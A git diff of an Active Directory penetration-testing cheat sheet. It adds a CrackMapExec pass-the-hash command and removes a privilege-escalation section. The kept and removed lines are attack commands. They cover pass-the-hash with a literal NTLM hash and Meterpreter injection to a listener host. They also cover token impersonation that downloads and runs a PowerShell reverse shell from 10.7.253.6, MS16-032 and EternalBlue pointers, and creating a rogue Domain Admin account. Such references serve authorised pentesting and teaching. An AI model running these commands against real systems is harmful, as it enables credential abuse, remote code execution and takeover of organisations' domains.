@@ -22,11 +22,6 @@
   * [Trust relationship between domains](#trust-relationship-between-domains)
   * [PrivExchange attack](#privexchange-attack)
   * [Password spraying](#password-spraying)
-* [Privilege Escalation](#privilege-escalation)
-  * [PrivEsc Local Admin - Token Impersonation (RottenPotato)](#privesc-local-admin---token-impersonation-rottenpotato)
-  * [PrivEsc Local Admin - MS16-032](#privesc-local-admin---ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
-  * [PrivEsc Local Admin - MS17-010 (Eternal Blue)](#privesc-local-admin---ms17-010-eternal-blue)
-  * [From Local Admin to Domain Admin](#from-local-admin-to-domain-admin)
 
 ## Tools
 
@@ -56,6 +51,7 @@
   git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
   crackmapexec smb -L
   crackmapexec smb -M name_module -o VAR=DATA
+  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --local-auth
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
@@ -597,56 +593,6 @@ Most of the time the best passwords to spray are :
 - Welcome1
 - $Companyname1
 
-
-## Privilege Escalation
-
-### PrivEsc Local Admin - Token Impersonation (RottenPotato)
-
-Binary available at : https://github.com/foxglovesec/RottenPotato
-Binary available at : https://github.com/breenmachine/RottenPotatoNG
-
-```c
-getuid
-getprivs
-use incognito
-list\_tokens -u
-cd c:\temp\
-execute -Hc -f ./rot.exe
-impersonate\_token "NT AUTHORITY\SYSTEM"
-```
-
-```powershell
-Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
-Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
-Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
-```
-
-### PrivEsc Local Admin - MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
-
-Check if the patch is installed : `wmic qfe list | find "3139914"`
-
-```powershell
-Powershell:
-https://www.exploit-db.com/exploits/39719/
-https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
-
-Binary exe : https://github.com/Meatballs1/ms16-032
-
-Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
-```
-
-### PrivEsc Local Admin - MS17-010 (Eternal Blue)
-
-```c
-nmap -Pn -p445 — open — max-hostgroup 3 — script smb-vuln-ms17–010 <ip_netblock>
-```
-
-### From Local Admin to Domain Admin
-
-```powershell
-net user hacker2 hacker123 /add /Domain
-net group "Domain Admins" hacker2 /add /domain
-```
 
 ## References
 
